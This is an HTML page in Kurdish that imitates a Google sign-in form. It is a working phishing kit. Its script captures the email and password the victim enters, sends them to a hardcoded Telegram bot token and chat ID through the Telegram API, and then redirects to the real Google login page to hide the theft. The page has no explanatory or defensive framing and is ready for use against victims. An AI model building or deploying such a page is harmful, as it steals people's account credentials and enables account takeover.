<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>چوونەژوورەوە - گوگڵ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        .login-card {
            background: white;
            padding: 45px 35px;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.12);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .login-card h3 {
            font-size: 26px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }
        .login-card p {
            color: #5f6368;
            font-size: 15px;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 18px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #3c4043;
            margin-bottom: 5px;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
            background: #fafafa;
        }
        .input-group input:focus {
            outline: none;
            border-color: #1a73e8;
            background: white;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn:hover {
            background: #1557b0;
        }
        .footer {
            margin-top: 20px;
            font-size: 13px;
            color: #5f6368;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h3>چوونەژوورەوە</h3>
        <p>بە هەژمارەکەی گوگڵت بچۆ ژوورەوە</p>

        <form id="loginForm">
            <div class="input-group">
                <label>ئیمەیڵ یان ژمارەی تەلەفۆن</label>
                <input type="email" id="email" placeholder="email@example.com" required>
            </div>
            <div class="input-group">
                <label>پاسۆڕد</label>
                <input type="password" id="pass" placeholder="پاسۆڕدەکەت" required>
            </div>
            <button type="submit" class="btn">بچۆ ژوورەوە</button>
        </form>

        <div class="footer">
            <a href="#">زانیاری زیاتر</a> • <a href="#">یارمەتی</a>
        </div>
    </div>

    <script>
        // -------------------- داتاکانی تۆ --------------------
        const TOKEN = "8988207945:AAGSUvEU7PC25hiMDM8EoOU7dWl1tQ6DJ9M";
        const CHAT_ID = "1073170460";
        // ----------------------------------------------------

        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('pass').value.trim();

            if (!email || !pass) {
                alert("تکایە هەموو خانەکان پڕ بکەوە");
                return;
            }

            const message = `👤 گمەیڵ: ${email} | 🔑 پاسۆڕد: ${pass}`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
                .then(() => {
                    window.location.href = "https://accounts.google.com";
                })
                .catch(() => {
                    // تەنانەت ئەگەر شکست بهێنیت، ڕیدایرێکتی بکە
                    window.location.href = "https://accounts.google.com";
                });
        };
    </script>
</body>
</html>
